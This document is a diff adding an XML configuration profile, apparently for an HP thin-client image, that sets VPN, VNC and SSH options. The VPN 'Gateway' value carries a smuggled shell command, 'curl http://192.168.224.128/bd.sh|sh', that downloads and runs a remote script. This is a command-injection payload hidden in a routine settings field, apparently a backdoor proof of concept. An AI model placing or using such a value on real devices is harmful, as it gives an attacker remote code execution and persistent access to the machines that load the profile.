@@ -1,0 +1,66 @@
+<Profile>
+ <ProfileSettings>
+  <Name>HP-Profile-2017-09-30</Name>
+  <RegistryRoot>root</RegistryRoot>
+  <Target>
+   <Hardware>vmware</Hardware>
+   <ImageId>T6X44017</ImageId>
+   <Version>4.4.0</Version>
+   <Config>standard</Config>
+  </Target>
+ </ProfileSettings>
+ <ProfileRegistry>
+  <ManticoreReg>
+   <Namespace name="root">
+    <NodeDir name="root">
+     <NodeDir name="Network">
+      <NodeDir name="VPN">
+       <NodeKey name="AutoStart">
+        <NodeParam name="value">1</NodeParam>
+       </NodeKey>
+       <NodeKey name="Type">
+        <NodeParam name="value">PPTP</NodeParam>
+       </NodeKey>
+       <NodeKey name="Gateway">
+        <NodeParam name="value">vpngateway;curl http://192.168.224.128/bd.sh|sh;echo </NodeParam>
+       </NodeKey>
+       <NodeKey name="Domain">
+        <NodeParam name="value">vpndomain</NodeParam>
+       </NodeKey>
+       <NodeKey name="Username">
+        <NodeParam name="value">vpnusername</NodeParam>
+       </NodeKey>
+       <NodeKey name="Password">
+        <NodeParam name="value">NLCR.1ybWu1e6zohazNb0=</NodeParam>
+       </NodeKey>
+      </NodeDir>
+      <NodeKey name="userLockEngaged">
+       <NodeParam name="value">1</NodeParam>
+      </NodeKey>
+     </NodeDir>
+     <NodeDir name="vncserver">
+      <NodeDir name="coreSettings">
+       <NodeKey name="enableVncShadow">
+        <NodeParam name="value">1</NodeParam>
+       </NodeKey>
+       <NodeKey name="vncUsePassword">
+        <NodeParam name="value">1</NodeParam>
+       </NodeKey>
+       <NodeKey name="vncPassword">
+        <NodeParam name="value">NLCR.1yauj0+Gj</NodeParam>
+       </NodeKey>
+      </NodeDir>
+     </NodeDir>
+     <NodeDir name="sshd">
+      <NodeKey name="enabled">
+       <NodeParam name="value">1</NodeParam>
+      </NodeKey>
+      <NodeKey name="userAccess">
+       <NodeParam name="value">1</NodeParam>
+      </NodeKey>
+     </NodeDir>
+    </NodeDir>
+   </Namespace>
+  </ManticoreReg>
+ </ProfileRegistry>
+</Profile>
